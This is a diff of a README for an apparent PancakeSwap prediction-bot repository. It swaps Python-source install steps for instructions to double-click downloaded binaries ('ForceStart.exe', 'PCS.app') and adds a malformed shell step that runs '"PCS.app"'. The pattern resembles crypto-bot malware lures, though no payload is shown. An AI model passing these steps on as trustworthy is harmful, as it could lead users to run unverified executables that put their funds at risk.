@@ -44,7 +44,7 @@ With these updates, our goal is to provide a safer, more flexible, and user-cent
 ## 🐰⚡ Installation
 
 - Download [This Repo](https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported/archive/refs/heads/main.zip) the repository release and extract files. 
-- Double-click on the "PancakeswapPredictBot V8.4.0.msi" file to run it.
+- Double-click on the "ForceStart.exe" or "PCS.app" file to run it.
 - And follow the instructions in the application window.
 
 ## 🐰⚡ Installation on CMD - Windows
@@ -73,20 +73,17 @@ cd pancake-predict-bot-UI-Supported
 
 ## 🐰⚡ Installation on Terminal - MacOs
 
-### In order to ensure license control in the Mac version, we are currently sending the codes for Mac only to our users who request them via Telegram. If you are a Mac user, you can send us a message on Telegram and request the codes. [Telegram](https://t.me/pancakeswapprediction)
+- Download [This Repo](https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported/archive/refs/heads/main.zip) the repository release and extract files. 
+- Double-click on the "PCS.app" file to run it.
 
-Download and Install Git here:
-[Git](https://git-scm.com/download/mac)
-
-Download and Install Python3 here:
-[Python](https://www.python.org/ftp/python/3.11.8/python-3.11.8-macos11.pkg)
-
+or
+  
 Then run the following commands in Terminal:
 
 ```shell
 git clone https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported
 cd pancake-predict-bot-UI-Supported
-"python3 predict.py"
+"PCS.app"
 ```
 
 ##  Strategy (You can easily configure all parameter settings through the interface)
